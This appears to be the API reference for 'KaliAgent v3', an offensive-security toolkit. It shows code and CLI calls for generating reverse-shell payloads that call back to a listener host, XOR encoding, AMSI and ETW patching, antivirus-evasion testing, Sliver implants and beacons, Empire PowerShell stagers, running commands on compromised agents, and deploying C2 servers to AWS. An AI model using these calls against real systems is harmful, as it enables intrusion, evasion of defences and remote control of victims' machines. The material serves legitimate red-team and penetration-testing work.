# KaliAgent v3 - API Reference

**Version:** 3.0.0  
**Last Updated:** April 21, 2026  

---

## Table of Contents

1. [Core Modules](#core-modules)
2. [Weaponization](#weaponization)
3. [C2 Infrastructure](#c2-infrastructure)
4. [Production](#production)

---

## Core Modules

### Tool Manager

```python
from core.tool_manager import ToolManager

manager = ToolManager()

# Search tools
tools = manager.search_tools(query='nmap', category='information-gathering')

# Get tool info
tool = manager.get_tool('nmap')

# Install tool
success = manager.install_tool('nmap')

# List installed tools
installed = manager.list_installed_tools()
```

### Hardware Manager

```python
from core.hardware_manager import HardwareManager

hw = HardwareManager()

# Detect WiFi adapters
adapters = hw.detect_wifi_adapters()

# Enable monitor mode
success, interface = hw.enable_monitor_mode('wlan0')

# Test packet injection
working, rate = hw.test_packet_injection('wlan0mon')

# Detect SDR devices
rtl = hw.detect_rtlsdr()
hackrf = hw.detect_hackrf()

# Get hardware status
hw.print_hardware_status()
```

### Installation Profiles

```python
from core.installation_profiles import ProfileManager, ProfileInstaller

pm = ProfileManager()

# List profiles
profiles = pm.list_profiles()

# Get profile
profile = pm.get_profile('standard')

# Recommend profile
recommended = pm.recommend_profile()

# Install profile
installer = ProfileInstaller(pm)
result = installer.install_profile('standard', dry_run=False)
```

### Authorization System

```python
from core.authorization import AuthorizationManager, AuthorizationLevel

auth = AuthorizationManager()

# Check authorization
authorized, reason = auth.check_authorization('nmap_scan')

# Request authorization
success, message, token = auth.request_authorization(
    'sql_injection',
    pin='1234',
    reason='Penetration testing'
)

# Use token
success, message = auth.use_token(token.token_id)
```

---

## Weaponization

### Payload Generator

```python
from weaponization.payload_generator import PayloadGenerator, Platform, PayloadType

gen = PayloadGenerator()

# Generate payload
from weaponization.payload_generator import PayloadConfig

config = PayloadConfig(
    name='reverse_tcp',
    payload_type=PayloadType.REVERSE_TCP,
    format=PayloadFormat.EXE,
    architecture=Architecture.X64,
    platform=Platform.WINDOWS,
    lhost='192.0.2.100',
    lport=4444
)

result = gen.generate(config)

# Multi-platform generation
platforms = [Platform.WINDOWS, Platform.LINUX, Platform.ANDROID]
results = gen.generate_multi_platform('multi', '192.0.2.100', 4444, platforms)
```

### Payload Encoder

```python
from weaponization.encoder import PayloadEncoder, EncoderType, ObfuscationTechnique

enc = PayloadEncoder()

# Encode payload
result = enc.encode(
    input_path=Path('payload.exe'),
    encoder=EncoderType.XOR_DYNAMIC,
    iterations=3
)

# AMSI patch
success, msg = enc.patch_amsi(Path('script.ps1'))

# ETW patch
success, msg = enc.patch_etw(Path('payload.exe'))

# Obfuscation
techniques = [
    ObfuscationTechnique.STRING_ENCRYPTION,
    ObfuscationTechnique.DEAD_CODE,
    ObfuscationTechnique.ANTI_DEBUG
]
success, msg = enc.add_obfuscation(Path('payload.ps1'), techniques)
```

### Testing Framework

```python
from weaponization.testing_framework import PayloadTester, TestType

tester = PayloadTester()

# Run all tests
report = tester.test_payload(Path('payload.exe'))

# Run specific tests
report = tester.test_payload(
    Path('payload.exe'),
    test_types=[
        TestType.SIZE_CHECK,
        TestType.SIGNATURE_CHECK,
        TestType.AV_EVASION
    ]
)

print(f"Status: {report.overall_status}")
print(f"Risk Score: {report.risk_score:.1f}/10")
```

### Weaponization Engine

```python
from weaponization.weaponization_engine import WeaponizationEngine
from payload_generator import Platform

engine = WeaponizationEngine()

# Quick weaponize
report = engine.quick_weaponize(
    name='my_payload',
    lhost='192.0.2.100',
    lport=4444,
    platform=Platform.WINDOWS
)

# Custom job
job = engine.create_job(
    name='advanced_payload',
    lhost='192.0.2.100',
    lport=8443,
    platform=Platform.WINDOWS,
    encode=True,
    encoder=EncoderType.XOR_DYNAMIC,
    apply_evasion=True,
    run_tests=True
)

report = engine.execute_job(job)
```

---

## C2 Infrastructure

### Sliver Client

```python
from c2.sliver_client import SliverClient, ImplantType, Protocol

client = SliverClient()

# Connect
success, message = client.connect('grpc://localhost:31337')

# Generate implant
success, message = client.generate_implant(
    name='reverse_https',
    implant_type=ImplantType.REVERSE_HTTPS,
    protocol=Protocol.HTTPS,
    lhost='192.0.2.100',
    lport=443
)

# Generate beacon
success, message = client.generate_beacon(
    name='beacon_1',
    interval=60,
    jitter=30,
    lhost='192.0.2.100',
    lport=443
)

# List implants
implants = client.list_implants()

# Start listener
success, message = client.start_listener(
    name='https_listener',
    protocol=Protocol.HTTPS,
    host='0.0.0.0',
    port=443
)
```

### Empire Client

```python
from c2.empire_client import EmpireClient, ListenerType, StagerType

client = EmpireClient()

# Connect
success, message = client.connect(
    'https://localhost:1337',
    username='empireadmin',
    password='password123'
)

# Create listener
success, message = client.create_listener(
    name='http_listener',
    listener_type=ListenerType.HTTP,
    host='0.0.0.0',
    port=8080
)

# Generate stager
success, payload = client.generate_stager(
    name='launcher',
    listener='http_listener',
    stager_type=StagerType.POWERSHELL
)

# List agents
agents = client.list_agents()

# Execute command
success, output = client.interact_agent(
    session_id='ABC123',
    command='whoami'
)
```

### C2 Orchestration

```python
from c2.orchestration import C2Orchestrator, C2FrameworkType, C2Server, C2Status

orch = C2Orchestrator()

# Add C2 servers
sliver_server = C2Server(
    id='sliver_1',
    name='Primary Sliver',
    framework=C2FrameworkType.SLIVER,
    host='192.0.2.100',
    port=31337,
    status=C2Status.ONLINE
)

orch.add_c2_server(sliver_server)

# Connect
success, message = orch.connect_to_server('sliver_1')

# Sync agents
count = orch.sync_agents()

# List agents
agents = orch.list_agents()

# Execute command
success, output = orch.execute_command(
    agent_id='agent_123',
    command='whoami'
)

# Health check
health = orch.health_check()

# Get statistics
stats = orch.get_statistics()
```

### Docker Deployment

```python
from c2.docker_deploy import DockerDeployment, C2Framework, CloudProvider

deploy = DockerDeployment()

# Create Sliver config
sliver_config = deploy.create_sliver_config(
    name='sliver-main',
    lhost='0.0.0.0',
    lport=31337
)

# Create Empire config
empire_config = deploy.create_empire_config(
    name='empire-main',
    lhost='0.0.0.0',
    rest_port=1337
)

# Generate Docker Compose
compose_path = deploy.generate_compose(
    'c2_deployment',
    [sliver_config, empire_config]
)

# Generate Terraform (AWS)
from c2.docker_deploy import DeploymentConfig, DockerConfig

deployment = DeploymentConfig(
    name='c2_aws',
    cloud_provider=CloudProvider.AWS,
    region='us-east-1',
    instance_type='t3.medium',
    c2_containers=[sliver_config, empire_config]
)

tf_path = deploy.generate_terraform_aws(deployment)

# Deploy
success, message = deploy.deploy(compose_path)

# Check status
status = deploy.status(compose_path)
```

---

## Production

### System Monitoring

```python
from production.monitoring import SystemMonitor, ResourceType, AlertLevel

monitor = SystemMonitor()

# Check resources
metrics = monitor.check_resources()

# Get health status
health = monitor.get_health_status()
print(f"Status: {health.status}")

# Get alerts
alerts = monitor.get_alerts(unacknowledged_only=True)

# Acknowledge alert
monitor.acknowledge_alert('alert_1')

# Export report
report_path = monitor.export_report()
```

### Security Auditor

```python
from production.security_audit import SecurityAuditor, SecurityLevel, ComplianceStandard

auditor = SecurityAuditor()

# Run security scan
findings = auditor.run_security_checks()

# Get security score
score_data = auditor.get_security_score()
print(f"Score: {score_data['score']}/100, Grade: {score_data['grade']}")

# Get findings
findings = auditor.get_findings(level=SecurityLevel.HIGH)

# Acknowledge finding
auditor.acknowledge_finding('finding_1')

# Log action
auditor.log_action(
    user='admin',
    action='execute_command',
    resource='agent_123',
    result='success',
    ip_address='192.0.2.1'
)

# Search audit log
entries = auditor.search_audit_log(
    user='admin',
    start_time=datetime.now() - timedelta(hours=24)
)

# Export audit log
audit_path = auditor.export_audit_log()
```

---

## CLI Quick Reference

### Core
```bash
# Tool manager
python3 tool_manager.py --search nmap
python3 tool_manager.py --install nmap

# Hardware
python3 hardware_manager.py --status
python3 hardware_manager.py --detect-wifi

# Profiles
python3 installation_profiles.py --list
python3 installation_profiles.py --install standard

# Authorization
python3 authorization.py --check nmap_scan
python3 authorization.py --authorize sql_injection --pin 1234
```

### Weaponization
```bash
# Payload generation
python3 payload_generator.py --lhost 192.0.2.100 --lport 4444

# Encoding
python3 encoder.py --encode payload.exe --encoder xor_dynamic

# Testing
python3 testing_framework.py --test payload.exe

# Full weaponization
python3 weaponization_engine.py --quick --lhost 192.0.2.100
```

### C2
```bash
# Sliver
python3 sliver_client.py --connect grpc://localhost:31337
python3 sliver_client.py --generate reverse_https

# Empire
python3 empire_client.py --connect https://localhost:1337
python3 empire_client.py --create-listener http_main

# Orchestration
python3 orchestration.py --add-server sliver_1 --framework sliver
python3 orchestration.py --sync-agents
python3 orchestration.py --health-check
```

### Production
```bash
# Monitoring
python3 monitoring.py --status
python3 monitoring.py --alerts
python3 monitoring.py --export

# Security
python3 security_audit.py --scan
python3 security_audit.py --score
python3 security_audit.py --findings
```

---

*For complete documentation, see individual module docstrings and the WEAPONIZATION_GUIDE.md*
